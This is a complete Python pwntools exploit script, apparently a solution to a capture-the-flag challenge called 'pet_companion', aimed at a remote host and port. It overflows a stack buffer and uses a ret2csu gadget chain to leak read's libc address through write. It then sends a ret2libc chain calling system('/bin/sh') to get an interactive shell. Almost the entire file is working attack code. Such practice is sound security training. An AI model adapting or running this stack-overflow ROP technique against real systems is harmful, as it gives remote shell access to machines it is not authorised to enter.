#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("challenge/pet_companion_patched")
libc = ELF("challenge/glibc/libc.so.6")
ld = ELF("challenge/glibc/ld-linux-x86-64.so.2")
context.binary = exe

host = "94.237.60.37"
port = 52721

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions

csu_pop = 0x00400736
csu_call = 0x00400720

def ret2csu(got_entry: int, edi: int, rsi: int, rdx: int, rbp: int, return_address: int):
    ret = flat(
        0,                  # skip first 8 bytes
        0,                  # rbx
        rbp,                # rbp
        got_entry,          # r12
        edi,                # r13
        rsi,                # r14
        rdx,                # r15
        return_address,     # ret
    )      
    
    return ret

# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp main+0
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

padding = b"a"*0x48

# ret2csu: leak libc address
payload = flat(
    padding,
    csu_pop,
    ret2csu(exe.got['write'], 1, exe.got['read'], 8, 1, csu_call),
    ret2csu(0, 0, 0, 0, 1, exe.sym['main'])
)
s(payload)

io.recvuntil(b"Configuring...\n\n")
leaked_read = u64(io.recv(8))
libc.address = leaked_read - libc.sym['read']
success(f"libc.address: {hex(libc.address)}")
# -----------------

# ret2libc
poprdi = 0x0000000000400743 #: pop rdi ; ret
ret = 0x00000000004004de #: ret

payload = flat(
    padding,
    poprdi,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym['system']
)

s(payload)
# -----------------

io.interactive()

